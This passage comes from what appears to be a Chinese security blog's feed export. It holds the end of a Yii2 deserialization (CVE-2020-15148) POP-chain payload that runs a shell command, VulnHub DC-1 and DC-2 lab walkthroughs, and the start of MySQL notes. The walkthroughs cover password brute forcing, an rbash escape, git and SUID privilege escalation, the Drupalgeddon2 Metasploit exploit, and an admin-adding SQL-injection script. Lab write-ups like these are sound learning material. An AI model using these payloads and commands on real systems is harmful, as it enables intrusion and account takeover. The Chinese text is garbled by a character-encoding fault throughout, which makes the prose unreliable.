variable">$this</span><span class="token operator">-></span><span class="token property">refers</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"AnyStringisOK"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>            <span class="token comment">// run() -> call_user_func($this->checkAccess, $this->id);</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'saveXML'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å‘åŒ…ï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513201308446.png" alt loading="lazy"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ul><li>å‘ç°è¿™å‡ ä¸ªpopé“¾ç”¨æ¥ç”¨å»æœ€åéƒ½æ˜¯é ç€<code>__call</code>æ–¹æ³•æ¥è§¦å‘ä»£ç æ‰§è¡Œï¼Œä»£ç å®¡è®¡çš„å°‘ï¼Œä»¥åå†é‡åˆ°ä»£ç å®¡è®¡çš„é—®é¢˜å¯ä»¥å¤šå¤šè€ƒè™‘è¿™ä¸€æ–¹é¢çš„ä¸œè¥¿</li><li>å–„äºæœç´¢ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ¯”å¦‚æ»¡è¶³<code>\$this-&gt;(\w+)-&gt;(\w+)\(\)</code>è¿™ä¸ªæ­£åˆ™çš„å°±å¯èƒ½å¯ä»¥è§¦å‘<code>__call</code>æ–¹æ³•</li><li>æ‰¾é“¾çš„å¼€ç«¯å¯ä»¥å°è¯•ä»<code>__destruct</code>å…¥æ‰‹ï¼Œç„¶åè¿½é“¾ï¼Œè¿½æ–¹æ³•</li><li><code>call_user_func</code>ä¸­çš„<code>callback</code>å¯ä»¥æ˜¯æ•°ç»„</li><li>æ•´ä¸ªpopé“¾ä¸‹æ¥è¿˜æ˜¯å­¦åˆ°ä¸å°‘ä¸œè¥¿çš„ï¼Œæ…¢æ…¢æ¥å§</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://v0w.top/2020/09/22/Yii2unserialize/">Yii2 ååºåˆ—åŒ–ï¼ˆCVE-2020-15148ï¼‰å­¦ä¹ ç¬”è®°</a></li><li><a href="https://forum.butian.net/share/56">Yiiååºåˆ—åŒ–æ¼æ´å¤ç°åˆ°æ–°åˆ©ç”¨é“¾å‘ç°</a></li><li><a href="https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA">CVE-2020-15148 Yii2ååºåˆ—åŒ–RCE POPé“¾åˆ†æ</a></li><li><a href="https://www.anquanke.com/post/id/217930">æˆ‘æ˜¯å¦‚ä½•æŒ–æ˜yii2ååºåˆ—åŒ–0dayçš„</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-DC-2é¶åœºç»ƒä¹ </title>
      <link href="posts/ce8eed56/"/>
      <url>posts/ce8eed56/</url>
      
        <content type="html"><![CDATA[<p>é¶æœºåœ°å€ï¼š192.168.99.150ï¼ˆDC-2ï¼‰<a href="https://www.vulnhub.com/entry/dc-2,311/">é“¾æ¥</a></p><p>æ¸—é€æœºï¼š192.168.99.188ï¼ˆKaliï¼‰</p><p>ç‰©ç†ä¸»æœºï¼š192.168.99.107ï¼ˆWindows10ï¼‰</p><p>ç›®æ ‡ï¼šå°½å¯èƒ½æ‹¿åˆ°æ›´å¤šçš„flagï¼Œæœ‰5ä¸ª</p><p>nmapä¸»æœºå‘ç°ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502172127928.png" alt loading="lazy"></p><p>è®¿é—®80ç«¯å£ï¼Œå‘ç°æ˜¯ä¸€ä¸ªWordPressç«™ç‚¹ï¼Œé¦–é¡µæœ‰flag1ï¼Œå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502172310497.png" alt loading="lazy"></p><p>ä¼¼ä¹æ˜¯è®©æˆ‘ä»¬å¯¹ç”¨æˆ·è¿›è¡Œçˆ†ç ´ï¼Œä½†å¸¸è§„çš„å¯†ç å­—å…¸é‡Œå¯èƒ½æ²¡æœ‰æˆ‘ä»¬æ‰€éœ€è¦çš„å¯†ç ï¼Œäºæ˜¯é‡‡ç”¨<code>Cewl</code>è¿›è¡Œå¯†ç ä¿¡æ¯æœé›†</p><pre class="language-none"><code class="language-none">cewl http:&#x2F;&#x2F;dc-2&#x2F; -m 3 -d 3 -e -v -w wppass.txt-m æœ€å°å•è¯é•¿åº¦-dï¼šçˆ¬ç½‘æ·±åº¦-eï¼šæ”¶é›†åŒ…å«emailåœ°å€ä¿¡æ¯-vï¼šVerboseæ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹ï¼ŒCewlä¼šå¯¼å‡ºç›®æ ‡ç½‘ç«™çš„è¯¦ç»†æ•°æ®-wï¼šä¿å­˜å­—å…¸æ–‡ä»¶</code></pre><p>å¾—åˆ°å­—å…¸åä½¿ç”¨wpscanå¯¹ç½‘ç«™åå°è¿›è¡Œæ‰«ææµ‹è¯•</p><pre class="language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P &#x2F;home&#x2F;kali&#x2F;msf_exp&#x2F;wppass.txt-e: æšä¸¾ uè¡¨ç¤ºæšä¸¾ç”¨æˆ·-P: çˆ†ç ´å¯†ç å­—å…¸è·¯å¾„</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502173058881.png" alt loading="lazy"></p><p>æ‹¿åˆ°ä¸¤ä¸ªç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç </p><pre class="language-none"><code class="language-none">Username: jerry, Password: adipiscingUsername: tom, Password: parturient</code></pre><p>ç™»å½•åå°ï¼Œåœ¨pageé‡Œæ‹¿åˆ°flag2</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502173751322.png" alt loading="lazy"></p><p>æ‰¾å…¶å®ƒçš„åˆ‡å…¥ç‚¹ï¼Œå‰é¢nmapåœ¨0-1000çš„ç«¯å£ä¸­åªæ‰«åˆ°äº†ä¸€ä¸ª80ç«¯å£ï¼ŒåŠ å¤§åŠ›åº¦ï¼Œæ”¹æˆ0-10000</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174409458.png" alt loading="lazy"></p><p>æ‰«åˆ°ä¸€ä¸ª7744çš„sshç«¯å£ï¼Œtomç”¨æˆ·è¿ä¸Šä½¿ç”¨wpçš„åå°å¯†ç å³å¯ç™»å½•ï¼Œjerryä¸è¡Œï¼Œå¯èƒ½ä¸æ˜¯è¿™ä¸ªå¯†ç ï¼Œä¹Ÿå¯èƒ½jerryä¸å…è®¸sshç™»å½•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174816845.png" alt loading="lazy"></p><p>ç™»å½•ç›®å½•ä¸‹æ‰¾åˆ°flag3ï¼ŒlessæŸ¥çœ‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174852430.png" alt loading="lazy"></p><p>éšåå°è¯•å¾ˆå¤šå‘½ä»¤ç”¨ä¸äº†ï¼Œå½“å‰ç›®å½•ä¸‹çš„usrç›®å½•ä¹Ÿè¿›ä¸å»ï¼ŒæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼ŒæŸ¥çœ‹<code>.bash_history</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502175516495.png" alt loading="lazy"></p><p><code>ls -al usr/bin</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502175312778.png" alt loading="lazy"></p><p>æœ‰å››ä¸ªå‘½ä»¤å¯ä»¥ç”¨ï¼Œå¹¶ä¸”ä½¿ç”¨çš„æ˜¯rbashï¼Œä¸€ä¸ªåŠŸèƒ½å—é™çš„bashï¼Œé™åˆ¶æ€§å¯èƒ½ä¼šæœ‰å¦‚ä¸‹</p><ul><li>ä½¿ç”¨å‘½ä»¤cdæ›´æ”¹ç›®å½•</li><li>è®¾ç½®æˆ–è€…å–æ¶ˆç¯å¢ƒå˜é‡çš„è®¾ç½®ï¼ˆSHELL, PATH, ENV, or BASH_ENVï¼‰</li><li>æŒ‡å®šåŒ…å«å‚æ•°<code>&#39;/&#39;</code>çš„æ–‡ä»¶å</li><li>æŒ‡å®šåŒ…å«å‚æ•°<code>&#39; - &#39;</code>çš„æ–‡ä»¶å</li><li>ä½¿ç”¨é‡å®šå‘è¾“å‡º<code>&#39;&gt;&#39;, &#39;&gt;&gt;&#39;, &#39;&gt; |&#39;, &#39;&lt;&gt;&#39; &#39;&gt;&amp;&#39;,&#39;&amp;&gt;&#39;</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502193832294.png" alt loading="lazy"></p><p>ä½¿ç”¨scpç»•è¿‡</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502193742568.png" alt loading="lazy"></p><p>è¿˜å¯ä»¥è¿™æ ·</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200235932.png" alt loading="lazy"></p><p>ä¹Ÿå¯ä»¥ç”¨viï¼Œæ–¹æ³•ä¸å”¯ä¸€ï¼Œæ¬å¼ å›¾ï¼Œå¯å‚è€ƒæ–‡æœ«çš„é“¾æ¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200311594.png" alt loading="lazy"></p><p>åœ¨jerryçš„ç”¨æˆ·ç›®å½•ä¸‹æ‰¾åˆ°<code>flag4.txt</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200512732.png" alt loading="lazy"></p><p><code>you&#39;re on your own now.  :-)</code>ï¼Œçº¿ç´¢<code>git</code></p><p>é…ç½®å½“å‰shellç¯å¢ƒå˜é‡</p><pre class="language-none"><code class="language-none">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502211021164.png" alt loading="lazy"></p><p>å¤§éƒ¨åˆ†å‘½ä»¤å¯ç”¨äº†</p><p>æ ¹æ®flag3çš„æç¤ºï¼Œsuåˆ‡æ¢åˆ°jerryï¼Œå¯†ç å°±æ˜¯ä¸Šé¢çš„å¯†ç ï¼Œ<code>sudo -l</code>çœ‹çœ‹ç”¨æˆ·å¯ä»¥ç”¨sudoè¿è¡Œä¸€äº›å‘½ä»¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502213404125.png" alt loading="lazy"></p><p>gitå¯ç”¨ï¼Œgitææƒ</p><pre class="language-none"><code class="language-none">sudo git help config  åœ¨æœ«è¡Œå‘½ä»¤æ¨¡å¼è¾“å…¥ !&#x2F;bin&#x2F;bash æˆ– !&#39;sh&#39;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502213732806.png" alt loading="lazy"></p><p>æˆåŠŸæ‹¿åˆ°æœ€åçš„flag    </p><p><strong>å‚è€ƒï¼š</strong></p><ul><li><a href="https://cloud.tencent.com/developer/article/1680551">RBash - å—é™çš„Bashç»•è¿‡</a></li><li><a href="https://www.const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Linux ææƒæ€»ç»“</a></li><li><a href="https://www.secpulse.com/archives/72965.html">åˆ©ç”¨é€šé…ç¬¦å®ç°Linuxæœ¬åœ°ææƒ</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-DC-1é¶åœºç»ƒä¹ </title>
      <link href="posts/5787bcec/"/>
      <url>posts/5787bcec/</url>
      
        <content type="html"><![CDATA[<p>é¶æœºä½¿ç”¨VMwareæ­å»ºï¼Œç½‘ç»œä¸ºæ¡¥æ¥æ¨¡å¼ï¼Œä¹Ÿå¯ä½¿ç”¨NATæ¨¡å¼</p><p>æ“ä½œä¸éš¾ï¼Œä¸»è¦å­¦æ€è·¯å’Œæ–¹æ³•ï¼Œè€æ˜¯çœ‹åˆ«äººæ¸—é€æ“ä½œæ„Ÿè§‰æˆ‘ä¸Šæˆ‘ä¹Ÿè¡Œï¼Œä½†å®é™…ä¸Šè‡ªå·±çœŸæ­£çš„æ¥æ“ä½œäº†å°±çŸ¥é“äº†ï¼Œè¶Šåˆ°åé¢å°±è¶Šä¸çŸ¥é“ä»ä½•å…¥æ‰‹ã€‚ã€‚ã€‚</p><p>é¶æœºï¼š192.168.99.170ï¼ˆDC-1ï¼‰ï¼Œ<a href="https://www.vulnhub.com/entry/dc-1,292/">vulnhubåœ°å€</a></p><p>æ¸—é€æœºï¼š192.168.99.188ï¼ˆKaliï¼‰</p><p>ç‰©ç†ä¸»æœºï¼š192.168.99.107ï¼ˆWindows10ï¼‰</p><p>ç›®æ ‡ï¼šå°½å¯èƒ½æ‹¿åˆ°æ›´å¤šçš„flag</p><p>nmapä¸»æœºå‘ç°ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -sP -PR 192.168.99.1&#x2F;24-sP: Ping Scan - go no further than determining if host is online-PR: ARP Ping</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501114628048.png" alt loading="lazy"></p><p>æ‰¾åˆ°é¶æœºåœ°å€ï¼Œå¯¹é¶æœºç«¯å£è¿›è¡Œæ‰«æï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">sudo nmap -T4 -A -sN 192.168.99.170-sN: TCP Null, FIN, and Xmas scans-A: Enables OS detection and Version detection</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501115129119.png" alt loading="lazy"></p><p>æŸ¥çœ‹80ç«¯å£æœ‰httpæœåŠ¡å¼€æ”¾ï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªDrupalç«™ç‚¹ï¼Œç‰ˆæœ¬ä¸ºDrupal 7ï¼Œç½‘ä¸Šæœæœ‰18å¹´çš„ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7600ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501155026635.png" alt loading="lazy"></p><p>ä¸Šmsfï¼Œ<code>search drupal</code>ï¼Œç”¨18å¹´çš„</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501155618792.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2set RHOSTS 192.169.99.170exploit</code></pre><p>æˆåŠŸå¼¹å›ä¸€ä¸ªshell</p><p>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯<code>sysinfo</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501164905497.png" alt loading="lazy"></p><p>è¿›å…¥ç³»ç»Ÿshellï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·ä¸ºwww-data</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501165519887.png" alt loading="lazy"></p><p>æœé›†ä¿¡æ¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501161345481.png" alt loading="lazy"></p><p>æ‹¿åˆ°flag1ï¼Œ<code>Every good CMS needs a config file - and so do you.</code>ï¼Œæ ¹æ®æç¤ºæ‰¾é…ç½®æ–‡ä»¶</p><p><code>search -f setting*</code> æˆ–<code>find . -type f | xargs grep &quot;password&quot;</code>æ‰¾settingå¼€å¤´çš„æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501163530112.png" alt loading="lazy"></p><p><code>download ./sites/default/settings.php /home/kali/</code>ä¸‹è½½ä¸‹æ¥çœ‹çœ‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501163755265.png" alt loading="lazy"></p><p>æ‹¿åˆ°flag2ï¼Œæ•°æ®åº“ç”¨æˆ·è´¦å·å¯†ç </p><pre class="language-none"><code class="language-none">dictionary attacks aren&#39;t theonly ways to gain access (and you WILL need access).What can you do with these credentials?&#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,&#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</code></pre><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>è¿›å…¥ä¸€ä¸ªäº¤äº’å¼çš„shellï¼Œä¸ºä»€ä¹ˆè¦ç”¨äº¤äº’å¼shellï¼Œå› ä¸ºéäº¤äº’shellæ— å›æ˜¾ï¼Œ<a href="https://blog.csdn.net/gui951753/article/details/79154496">è¯¦è§</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501165847912.png" alt loading="lazy"></p><p><code>mysql -udbuser -pR0ck3t</code>ç™»å½•<code>mysql</code>å‘½ä»¤è¡Œ</p><p><code>select * from users \G;</code> </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501202239805.png" alt loading="lazy"></p><p>adminå¯†ç åŠ å¯†çš„ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªæ–¹æ³•å¯ä»¥æ‹¿åˆ°åå°ç®¡ç†å‘˜çš„è´¦å·</p><p>ä¸€ä¸ªæ˜¯æŠŠæ•°æ®åº“ä¸­adminçš„å¯†ç ç»™æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„å¯†ç ï¼Œå‰ææ˜¯è¦ç»è¿‡<code>Drupal</code>åç«¯åŠ å¯†çš„æ‰è¡Œ</p><p>åœ¨ç½‘ç«™æ ¹ç›®å½•<code>scripts</code>æ‰¾åˆ°åŠ å¯†è„šæœ¬ï¼Œ<a href="http://drupalchina.cn/node/2128">å‚è€ƒ</a></p><p>æ‰§è¡ŒåŠ å¯†è„šæœ¬<code>php scripts/password-hash.sh 123456</code>ï¼Œå¾—åˆ°<code>123456</code>åŠ å¯†åçš„å¯†ç <code>$S$DO3Rg8SH1xaO3lXuF8sKc8905t0xwoMMO80Ikju//Ia1JwdtrWz5</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501202852481.png" alt loading="lazy"></p><p>åœ¨æ•°æ®åº“ä¸­<code>update</code>ç®¡ç†å‘˜çš„å¯†ç ï¼Œå³å¯ç”¨æ›´æ”¹åçš„å¯†ç ç™»å½•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501203540144.png" alt loading="lazy"></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œ<code>searchsploit drupal</code>å‘ç°<code>Drupal 7.0 &lt; 7.31</code>ç‰ˆæœ¬å­˜åœ¨SQLæ³¨å…¥ï¼Œå¯ä»¥ç›´æ¥æ·»åŠ ç®¡ç†å‘˜è´¦å·ï¼Œ<a href="https://www.exploit-db.com/exploits/34992">è¯¦è§</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204048208.png" alt loading="lazy"></p><p><code>python 34992.py -t http://192.168.99.170 -u extrader -p 123456</code> å³å¯æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</p><p>ç™»å½•åå°</p><p>contenté‡Œæ‰¾åˆ°flag3</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204137968.png" alt loading="lazy"></p><p>æš—ç¤º<code>shadow</code>ï¼Œ<code>cat /etc/passwd</code>ï¼Œå‘ç°flag4ç”¨æˆ·</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501204348304.png" alt loading="lazy"></p><p>åœ¨<code>/home/flag4</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>flag4.txt</code>æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501162541392.png" alt loading="lazy"></p><p>è¿™é‡Œè¿˜å¯ä»¥ç”¨<code>hydra</code>çˆ†ç ´flag4çš„å¯†ç ï¼Œè™½ç„¶æ²¡å•¥ç”¨ï¼Œå­¦æ“ä½œå°±å¤Ÿäº†</p><pre class="language-none"><code class="language-none">-l æŒ‡å®šç”¨æˆ·å-P åŠ è½½å¯†ç å­—å…¸ï¼ˆè‡ªå®šä¹‰)ssh:&#x2F;&#x2F;ip æŒ‡å®šä½¿ç”¨åè®®å’Œipåœ°å€</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501210421392.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501210913760.png" alt loading="lazy"></p><pre class="language-none"><code class="language-none">Can you use this same method to find or access the flag in root?Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></pre><p>æ„æ€è¦æˆ‘ä»¬ææƒ</p><p>suidææƒ</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>æ‰¾åˆ°ä¸€ä¸ªå±äºrootçš„æœ‰sæƒé™çš„æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501205439109.png" alt loading="lazy"></p><p>ææƒï¼Œåœ¨<code>/root</code>ç›®å½•ä¸‹æ‹¿åˆ°æœ€ç»ˆçš„flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-1/image-20210501205503876.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLå­¦ä¹ ç¬”è®°</title>
      <link href="posts/f12cbde5/"/>
      <url>posts/f12cbde5/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQLå­˜å‚¨å¼•æ“"><a href="#MySQLå­˜å‚¨å¼•æ“" class="headerlink" title="MySQLå­˜å‚¨å¼•æ“"></a>MySQLå­˜å‚¨å¼•æ“</h3><p>å­˜å‚¨å¼•æ“æ˜¯MySQLç»„ä»¶ï¼Œç”¨äºå¤„ç†ä¸åŒç±»å‹çš„SQLæ“ä½œã€‚</p><p>ä½¿ç”¨ <a href="https://dev.mysql.com/doc/refman/5.7/en/show-engines.html"><code>SHOW ENGINES</code></a> è¯­å¥æŸ¥çœ‹æœåŠ¡å™¨æ”¯æŒå“ªäº›å­˜å‚¨å¼•æ“ï¼ŒSupportåˆ—ä¸­è¡¨ç¤ºæ˜¯å¦å¯ä»¥ä½¿ç”¨ï¼ŒDEFAULTè¡¨ç¤ºé»˜è®¤å€¼ã€‚ï¼ˆä¸‹å›¾ç‰ˆæœ¬ä¸ºMySQL 5.7.26ï¼ŒWindows 10ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409135417092.png" alt loading="lazy"></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html"><code>InnoDB</code></a> æ˜¯é»˜è®¤çš„ä¸”ç”¨é€”æœ€å¹¿çš„å­˜å‚¨å¼•æ“ï¼ŒOracleå®˜æ–¹å»ºè®®å°†å…¶ç”¨äºè¡¨ï¼ˆç‰¹æ®Šç”¨ä¾‹é™¤å¤–ï¼‰ã€‚ï¼ˆé»˜è®¤æƒ…å†µä¸‹ ï¼ŒMySQL 5.7 or MySQL 8.0 ä¸­ä½¿ç”¨  <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table.html"><code>CREATE TABLE</code></a> è¯­å¥åˆ›å»º<code>InnoDB</code>è¡¨ã€‚ï¼‰</p><h4 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h4><p>äº‹åŠ¡å‹æ•°æ®åº“çš„é¦–é€‰å¼•æ“ï¼Œæ”¯æŒäº‹åŠ¡å®‰å…¨ï¼ˆACIDï¼‰ï¼Œå…·æœ‰æäº¤ï¼ˆCOMMITï¼‰ï¼Œå›æ»šï¼ˆROLLBACKï¼‰å’Œå¥”æºƒæ¢å¤ï¼ˆcrash-recoveryï¼‰åŠŸèƒ½ <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-acid.html">InnoDB and the ACID Model</a></p><p>è¡Œçº§é”å®šå’ŒOracleé£æ ¼çš„ä¸€è‡´è¯»å–å¯æé«˜å¤šç”¨æˆ·çš„å¹¶å‘æ€§å’Œæ€§èƒ½ <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-locking-transaction-model.html">InnoDB Locking and Transaction Model</a></p><p>InnoDBå°†æ•°æ®å­˜æ”¾åœ¨ç£ç›˜ä¸Šï¼Œä»¥åŸºäºä¸»é”®ä¼˜åŒ–æŸ¥è¯¢ï¼Œæ¯ä¸ªInnoDBè¡¨éƒ½æœ‰ä¸€ä¸ªç§°ä¸ºèšé›†ç´¢å¼•ï¼ˆThe Clustered Indexï¼‰çš„ä¸»é”®ç´¢å¼•ï¼Œè¯¥ç´¢å¼•ç»„ç»‡æ•°æ®ä»¥æœ€å°åŒ–ä¸»é”®æŸ¥æ‰¾<code>I/O</code> <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-index-types.html">Clustered and Secondary Indexes</a></p><p>ä¸ºäº†ä¿æŒæ•°æ®çš„å®Œæ•´æ€§ï¼ŒInnoDBæ”¯æŒ <code>FOREIGN KEY</code> çº¦æŸï¼Œä½¿ç”¨å¤–é”®æ£€æŸ¥æ’å…¥ï¼Œæ›´æ–°å’Œåˆ é™¤ï¼Œä»¥ç¡®ä¿å®ƒä»¬ä¸ä¼šå¯¼è‡´ç›¸å…³è¡¨ä¹‹é—´çš„ä¸ä¸€è‡´ã€‚ <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table-foreign-keys.html">FOREIGN KEY 